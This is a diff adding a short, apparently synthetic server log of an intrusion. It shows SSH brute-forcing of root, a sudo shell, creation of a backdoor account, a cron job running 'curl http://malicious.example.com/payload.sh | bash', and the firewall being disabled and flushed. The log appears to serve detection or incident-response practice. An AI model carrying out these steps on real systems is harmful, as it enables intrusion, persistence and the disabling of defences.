@@ -1,0 +1,20 @@
+Jun 07 14:00:01 server sshd[1001]: Failed password for root from 185.220.101.15 port 50101 ssh2
+Jun 07 14:00:03 server sshd[1002]: Failed password for root from 185.220.101.15 port 50102 ssh2
+Jun 07 14:00:05 server sshd[1003]: Failed password for root from 185.220.101.15 port 50103 ssh2
+Jun 07 14:00:07 server sshd[1004]: Failed password for root from 185.220.101.15 port 50104 ssh2
+Jun 07 14:00:09 server sshd[1005]: Failed password for root from 185.220.101.15 port 50105 ssh2
+Jun 07 14:00:12 server sshd[1006]: Accepted password for root from 185.220.101.15 port 50106 ssh2
+
+Jun 07 14:01:00 server sudo: attacker : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+
+Jun 07 14:01:15 server useradd[2001]: new user: name=backupsvc uid=1051 gid=1051 home=/home/backupsvc shell=/bin/bash
+
+Jun 07 14:01:25 server passwd[2002]: password changed for backupsvc
+
+Jun 07 14:02:00 server CRON[3001]: (root) CMD (/usr/bin/curl http://malicious.example.com/payload.sh | bash)
+
+Jun 07 14:02:30 server systemd[1]: firewalld.service: Stopped.
+
+Jun 07 14:03:00 server iptables[4001]: Flushed all firewall rules
+
+Jun 07 14:03:30 server systemd[1]: nginx.service: Failed with result 'exit-code'
